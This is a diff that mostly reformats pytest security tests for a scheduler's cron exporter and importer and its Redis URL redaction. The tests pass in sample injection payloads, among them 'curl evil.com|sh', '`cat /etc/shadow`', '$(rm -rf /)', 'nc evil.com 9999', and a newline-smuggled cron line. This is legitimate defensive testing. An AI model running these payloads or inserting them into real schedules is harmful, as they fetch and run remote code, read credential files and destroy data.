@@ -12,7 +12,6 @@ from pathlib import Path
 
 import pytest
 
-
 # =====================================================================
 # 1.1 + 1.2: Cron exporter rejects shell-injection in expression /
 #            sanitises name newlines
@@ -26,30 +25,42 @@ class TestCronExporterShellInjection:
     """
 
     def _exported(
-        self, *, expression: str, name: str = "x", task: str = "app.t",
+        self,
+        *,
+        expression: str,
+        name: str = "x",
+        task: str = "app.t",
     ):
-        from z4j_scheduler.exporters._client import (  # noqa: PLC0415
+        from z4j_scheduler.exporters._client import (
             ExportedSchedule,
         )
 
         return ExportedSchedule(
             id="00000000-0000-0000-0000-000000000001",
-            name=name, engine="celery", kind="cron",
-            expression=expression, task_name=task,
-            timezone="UTC", queue=None, args=[], kwargs={},
-            catch_up="skip", is_enabled=True,
-            scheduler="z4j-scheduler", source="dashboard",
+            name=name,
+            engine="celery",
+            kind="cron",
+            expression=expression,
+            task_name=task,
+            timezone="UTC",
+            queue=None,
+            args=[],
+            kwargs={},
+            catch_up="skip",
+            is_enabled=True,
+            scheduler="z4j-scheduler",
+            source="dashboard",
         )
 
     def test_safe_cron_expression_renders(self) -> None:
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
         out = cron.render([self._exported(expression="0 * * * *")])
         # Expression appears in a real cron line.
         assert "0 * * * * $WRAPPER" in out
 
     def test_semicolon_in_expression_refused(self) -> None:
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
         # The exploit case: a malicious schedule's expression
         # contains shell metacharacters. The exporter MUST refuse
@@ -57,9 +68,11 @@ class TestCronExporterShellInjection:
         # appear inside a comment ("# REFUSED ... <expression> ...")
         # which is inert under cron, but no NON-comment line may
         # carry the metacharacters.
-        out = cron.render([
-            self._exported(expression="* * * * * ; curl evil.com|sh #"),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="* * * * * ; curl evil.com|sh #"),
+            ]
+        )
         # Refused-line marker present.
         assert "REFUSED" in out
         # Walk every line: if it carries shell metachars it MUST
@@ -69,33 +82,38 @@ class TestCronExporterShellInjection:
             if not stripped or stripped.startswith("#") or stripped.startswith("WRAPPER="):
                 continue
             assert "; curl" not in stripped, (
-                f"active (non-comment) cron line carries shell "
-                f"metacharacters: {stripped!r}"
+                f"active (non-comment) cron line carries shell metacharacters: {stripped!r}"
             )
             assert "|" not in stripped or "$WRAPPER" not in stripped
 
     def test_backtick_in_expression_refused(self) -> None:
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
-        out = cron.render([
-            self._exported(expression="* * * * * `cat /etc/shadow`"),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="* * * * * `cat /etc/shadow`"),
+            ]
+        )
         assert "REFUSED" in out
 
     def test_dollar_paren_in_expression_refused(self) -> None:
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
-        out = cron.render([
-            self._exported(expression="* * * * * $(rm -rf /)"),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="* * * * * $(rm -rf /)"),
+            ]
+        )
         assert "REFUSED" in out
 
     def test_pipe_in_expression_refused(self) -> None:
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
-        out = cron.render([
-            self._exported(expression="* * * * * | nc evil.com 9999"),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="* * * * * | nc evil.com 9999"),
+            ]
+        )
         assert "REFUSED" in out
 
     def test_dow_letter_alias_refused_too(self) -> None:
@@ -103,22 +121,26 @@ class TestCronExporterShellInjection:
         # cron-side but the exporter rejects them because they
         # widen the audit surface for diminishing return. This
         # test pins that conservative choice.
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
-        out = cron.render([
-            self._exported(expression="0 9 * * MON-FRI"),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="0 9 * * MON-FRI"),
+            ]
+        )
         assert "REFUSED" in out
 
     def test_newline_in_name_sanitised(self) -> None:
         # Pre-fix: a name with embedded \n could break out of the
         # ``# {name}`` comment and inject an active cron line below.
-        from z4j_scheduler.exporters import cron  # noqa: PLC0415
+        from z4j_scheduler.exporters import cron
 
         injected_name = "innocuous\n0 * * * * curl evil.com"
-        out = cron.render([
-            self._exported(expression="0 * * * *", name=injected_name),
-        ])
+        out = cron.render(
+            [
+                self._exported(expression="0 * * * *", name=injected_name),
+            ]
+        )
         # The newline is collapsed - no second cron line lurks
         # under what looks like the comment.
         for line in out.splitlines():
@@ -131,9 +153,7 @@ class TestCronExporterShellInjection:
                 continue
             # Every active line must reference $WRAPPER
             # (the legitimate render shape).
-            assert "$WRAPPER" in stripped, (
-                f"unexpected active line in output: {stripped!r}"
-            )
+            assert "$WRAPPER" in stripped, f"unexpected active line in output: {stripped!r}"
 
 
 # =====================================================================
@@ -143,7 +163,7 @@ class TestCronExporterShellInjection:
 
 class TestCronImporterPathSafety:
     def test_oversized_file_rejected(self, tmp_path: Path) -> None:
-        from z4j_scheduler.importers.cron import (  # noqa: PLC0415
+        from z4j_scheduler.importers.cron import (
             read_crontab,
         )
 
@@ -158,15 +178,13 @@ class TestCronImporterPathSafety:
             )
 
     def test_normal_file_imports(self, tmp_path: Path) -> None:
-        from z4j_scheduler.importers.cron import (  # noqa: PLC0415
+        from z4j_scheduler.importers.cron import (
             read_crontab,
         )
 
         crontab = tmp_path / "small.cron"
         crontab.write_text(
-            "# header\n"
-            "0 * * * * /usr/local/bin/heartbeat\n"
-            "*/5 * * * * /usr/local/bin/poll\n",
+            "# header\n0 * * * * /usr/local/bin/heartbeat\n*/5 * * * * /usr/local/bin/poll\n",
         )
         rows = read_crontab(
             crontab_path=crontab,
@@ -176,17 +194,18 @@ class TestCronImporterPathSafety:
         assert len(rows) == 2
 
     def test_symlink_to_sensitive_file_refused_on_posix(
-        self, tmp_path: Path,
+        self,
+        tmp_path: Path,
     ) -> None:
         # POSIX-only: O_NOFOLLOW behaviour. On Windows symlinks
         # require elevation to create, so the threat model is
         # weaker; we skip the assertion there.
-        import sys  # noqa: PLC0415
+        import sys
 
         if sys.platform == "win32":
             pytest.skip("O_NOFOLLOW is a no-op on Windows")
 
-        from z4j_scheduler.importers.cron import (  # noqa: PLC0415
+        from z4j_scheduler.importers.cron import (
             read_crontab,
         )
 
@@ -212,7 +231,7 @@ class TestCronImporterPathSafety:
 
 class TestRqImporterUrlRedaction:
     def test_password_in_url_redacted(self) -> None:
-        from z4j_scheduler.importers.rq import (  # noqa: PLC0415
+        from z4j_scheduler.importers.rq import (
             _redact_redis_url,
         )
 
@@ -222,7 +241,7 @@ class TestRqImporterUrlRedaction:
         assert "host:6379" in red
 
     def test_username_password_in_url_redacted(self) -> None:
-        from z4j_scheduler.importers.rq import (  # noqa: PLC0415
+        from z4j_scheduler.importers.rq import (
             _redact_redis_url,
         )
 
@@ -232,7 +251,7 @@ class TestRqImporterUrlRedaction:
         assert "alice" in red
 
     def test_no_password_passes_through(self) -> None:
-        from z4j_scheduler.importers.rq import (  # noqa: PLC0415
+        from z4j_scheduler.importers.rq import (
             _redact_redis_url,
         )
 
@@ -240,7 +259,7 @@ class TestRqImporterUrlRedaction:
         assert _redact_redis_url(plain) == plain
 
     def test_unparseable_url_does_not_raise(self) -> None:
-        from z4j_scheduler.importers.rq import (  # noqa: PLC0415
+        from z4j_scheduler.importers.rq import (
             _redact_redis_url,
         )
 
